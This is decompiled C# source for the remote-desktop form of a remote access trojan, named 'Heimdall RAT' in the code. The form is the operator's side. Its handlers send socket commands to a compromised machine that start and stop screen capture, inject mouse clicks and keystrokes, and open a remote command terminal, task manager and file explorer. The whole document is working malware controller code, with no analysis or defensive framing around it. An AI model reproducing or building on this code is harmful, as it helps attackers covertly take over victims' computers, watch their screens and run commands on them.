	{
		try
		{
			if (Operators.ConditionalCompareObjectEqual(((Control)MN).get_Tag(), (object)"0", false))
			{
				((Control)MN).set_Tag((object)"1");
				((ButtonBase)MN).set_Image(ImageList1.get_Images().get_Item(7));
				((Form)this).set_FormBorderStyle((FormBorderStyle)0);
				((Form)this).set_WindowState((FormWindowState)2);
				((Control)VerticalProgressbar1).set_Visible(false);
				((Form)this).set_TopMost(true);
			}
			else
			{
				((Control)MN).set_Tag((object)"0");
				((ButtonBase)MN).set_Image(ImageList1.get_Images().get_Item(6));
				((Form)this).set_FormBorderStyle((FormBorderStyle)4);
				((Form)this).set_WindowState((FormWindowState)0);
				((Control)VerticalProgressbar1).set_Visible(true);
				((Form)this).set_TopMost(false);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void M_Click(object sender, EventArgs e)
	{
		try
		{
			if (Operators.ConditionalCompareObjectEqual(((Control)ST).get_Tag(), (object)"1", false))
			{
				if (Operators.ConditionalCompareObjectEqual(((Control)M).get_Tag(), (object)"0", false))
				{
					((Control)M).set_Tag((object)"1");
					((ButtonBase)M).set_Image(ImageList1.get_Images().get_Item(3));
				}
				else
				{
					((Control)M).set_Tag((object)"0");
					((ButtonBase)M).set_Image(ImageList1.get_Images().get_Item(2));
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void OpenTerminalToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MyProject.Forms.FrmMAINGR.s.Send(sock, "Cmd");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void OpenTaskManagerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MyProject.Forms.FrmMAINGR.s.Send(sock, "TM");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void OpenFileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MyProject.Forms.FrmMAINGR.s.Send(sock, "E");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void P1_DoubleClick(object sender, EventArgs e)
	{
		try
		{
			if (Operators.ConditionalCompareObjectEqual(((Control)M).get_Tag(), (object)"0", false))
			{
				if (Operators.ConditionalCompareObjectEqual(((Control)MN).get_Tag(), (object)"0", false))
				{
					((Control)MN).set_Tag((object)"1");
					((ButtonBase)MN).set_Image(ImageList1.get_Images().get_Item(7));
					((Form)this).set_FormBorderStyle((FormBorderStyle)0);
					((Form)this).set_WindowState((FormWindowState)2);
					((Control)VerticalProgressbar1).set_Visible(false);
					((Form)this).set_TopMost(true);
				}
				else
				{
					((Control)MN).set_Tag((object)"0");
					((ButtonBase)MN).set_Image(ImageList1.get_Images().get_Item(6));
					((Form)this).set_FormBorderStyle((FormBorderStyle)4);
					((Form)this).set_WindowState((FormWindowState)0);
					((Control)VerticalProgressbar1).set_Visible(true);
					((Form)this).set_TopMost(false);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void P1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Invalid comparison between Unknown and I4
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Invalid comparison between Unknown and I4
		try
		{
			if (Operators.ConditionalCompareObjectEqual(((Control)M).get_Tag(), (object)"1", false))
			{
				Point point = new Point(Convert.ToInt32(Math.Round(decimal.Multiply(new decimal(e.get_X()), decimal.Divide(new decimal(Sz.Width), new decimal(((Control)P1).get_Width()))))), Convert.ToInt32(Math.Round(decimal.Multiply(new decimal(e.get_Y()), decimal.Divide(new decimal(Sz.Height), new decimal(((Control)P1).get_Height()))))));
				int num = default(int);
				if ((int)e.get_Button() == 1048576)
				{
					num = 2;
				}
				if ((int)e.get_Button() == 2097152)
				{
					num = 8;
				}
				MyProject.Forms.FrmMAINGR.s.Send(sock, "#" + MyProject.Forms.FrmMAINGR.Key + point.X + MyProject.Forms.FrmMAINGR.Key + point.Y + MyProject.Forms.FrmMAINGR.Key + num);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void P1_MouseMove(object sender, MouseEventArgs e)
	{
		try
		{
			if (!Operators.ConditionalCompareObjectEqual(((Control)ST).get_Tag(), (object)"1", false))
			{
				return;
			}
			if (Operators.ConditionalCompareObjectEqual(((Control)SH).get_Tag(), (object)"0", false))
			{
				PO = e.get_Location();
				PO = e.get_Location();
				if (PO.Y < 20)
				{
					((Control)CO).set_Visible(true);
				}
				else
				{
					((Control)CO).set_Visible(false);
				}
			}
			else
			{
				((Control)CO).set_Visible(true);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void P1_MouseUp(object sender, MouseEventArgs e)
	{
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Invalid comparison between Unknown and I4
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Invalid comparison between Unknown and I4
		try
		{
			if (Operators.ConditionalCompareObjectEqual(((Control)M).get_Tag(), (object)"1", false))
			{
				Point point = new Point(Convert.ToInt32(Math.Round(decimal.Multiply(new decimal(e.get_X()), decimal.Divide(new decimal(Sz.Width), new decimal(((Control)P1).get_Width()))))), Convert.ToInt32(Math.Round(decimal.Multiply(new decimal(e.get_Y()), decimal.Divide(new decimal(Sz.Height), new decimal(((Control)P1).get_Height()))))));
				int num = default(int);
				if ((int)e.get_Button() == 1048576)
				{
					num = 4;
				}
				if ((int)e.get_Button() == 2097152)
				{
					num = 16;
				}
				MyProject.Forms.FrmMAINGR.s.Send(sock, "#" + MyProject.Forms.FrmMAINGR.Key + point.X + MyProject.Forms.FrmMAINGR.Key + point.Y + MyProject.Forms.FrmMAINGR.Key + num);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Q_SelectedIndexChanged(object sender, EventArgs e)
	{
		try
		{
			MyProject.Forms.FrmMAINGR.s.Send(sock, "Q" + MyProject.Forms.FrmMAINGR.Key + Conversions.ToString(SocketServer.GetIndex(Q.get_SelectedIndex())));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RD_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			MyProject.Forms.FrmMAINGR.s.Send(sock, "Abort");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RD_Resize(object sender, EventArgs e)
	{
		try
		{
			try
			{
				Point location = new Point(checked((int)Math.Round(Math.Round(Convert.ToDouble(new decimal(((Form)this).get_Size().Width)) / 2.0 - Convert.ToDouble(new decimal(((Control)CO).get_Size().Width)) / 2.0))), 0);
				((Control)CO).set_Location(location);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Operators.ConditionalCompareObjectEqual(((Control)ST).get_Tag(), (object)"1", false))
			{
				((Form)this).set_Text(T + " ======> " + ((Control)P1).get_Width() + " X " + ((Control)P1).get_Height());
				MyProject.Forms.FrmMAINGR.s.Send(sock, "SIZE" + MyProject.Forms.FrmMAINGR.Key + ((Control)P1).get_Width() + MyProject.Forms.FrmMAINGR.Key + ((Control)P1).get_Height());
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void SA_Click(object sender, EventArgs e)
	{
		try
		{
			if (Operators.ConditionalCompareObjectEqual(((Control)ST).get_Tag(), (object)"1", false))
			{
				if (Operators.ConditionalCompareObjectEqual(((Control)SA).get_Tag(), (object)"0", false))
				{
					((Control)SA).set_Tag((object)"1");
					((ButtonBase)SA).set_Image(ImageList1.get_Images().get_Item(15));
					Process.Start(FolderSavePic);
				}
				else
				{
					((Control)SA).set_Tag((object)"0");
					((ButtonBase)SA).set_Image(ImageList1.get_Images().get_Item(9));
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void SH_Click(object sender, EventArgs e)
	{
		try
		{
			if (Operators.ConditionalCompareObjectEqual(((Control)ST).get_Tag(), (object)"1", false))
			{
				if (Operators.ConditionalCompareObjectEqual(((Control)SH).get_Tag(), (object)"0", false))
				{
					((Control)SH).set_Tag((object)"1");
					((ButtonBase)SH).set_Image(ImageList1.get_Images().get_Item(10));
				}
				else
				{
					((Control)SH).set_Tag((object)"0");
					((ButtonBase)SH).set_Image(ImageList1.get_Images().get_Item(11));
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ST_Click(object sender, EventArgs e)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (D.get_Text().Length == 0)
			{
				MessageBox.Show("You must choose a monitor!", "Heimdall RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else if (Operators.ConditionalCompareObjectEqual(((Control)ST).get_Tag(), (object)"0", false))
			{
				((Control)ST).set_Tag((object)"1");
				((ButtonBase)ST).set_Image(ImageList1.get_Images().get_Item(1));
				MyProject.Forms.FrmMAINGR.s.Send(sock, "Start Capture" + MyProject.Forms.FrmMAINGR.Key + D.get_SelectedIndex() + MyProject.Forms.FrmMAINGR.Key + SocketServer.GetIndex(Q.get_SelectedIndex()));
				((Control)D).set_Enabled(false);
			}
			else
			{
				((Control)CO).set_Visible(true);
				MyProject.Forms.FrmMAINGR.s.Send(sock, "Stop");
				((Control)D).set_Enabled(true);
				((ProgressBar)VerticalProgressbar1).set_Value(0);
				((Control)ST).set_Tag((object)"0");
				((ButtonBase)ST).set_Image(ImageList1.get_Images().get_Item(0));
				((Control)M).set_Tag((object)"0");
				((ButtonBase)M).set_Image(ImageList1.get_Images().get_Item(2));
				((Control)KE).set_Tag((object)"0");
				((ButtonBase)KE).set_Image(ImageList1.get_Images().get_Item(4));
				((Control)SA).set_Tag((object)"0");
				((ButtonBase)SA).set_Image(ImageList1.get_Images().get_Item(9));
				((Control)SH).set_Tag((object)"0");
				((ButtonBase)SH).set_Image(ImageList1.get_Images().get_Item(10));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RD_Load(object sender, EventArgs e)
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		P1.set_Image((Image)new Bitmap(Sz.Width, Sz.Height));
		Point location = new Point(checked((int)Math.Round((double)((Form)this).get_Size().Width / 2.0 - (double)((Control)CO).get_Size().Width / 2.0)), 0);
		((Control)CO).set_Location(location);
		ref Point pO = ref PO;
		pO = new Point(30, 30);
		D.set_SelectedIndex(0);
		Q.set_SelectedIndex(2);
		ST.PerformClick();
	}

	private void KE_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected I4, but got Unknown
		if (Operators.ConditionalCompareObjectEqual(((Control)ST).get_Tag(), (object)"0", false))
		{
			MyProject.Forms.FrmMAINGR.s.Send(sock, "KeyBoardType" + MyProject.Forms.FrmMAINGR.Key + (int)e.get_KeyCode());
		}
	}
}
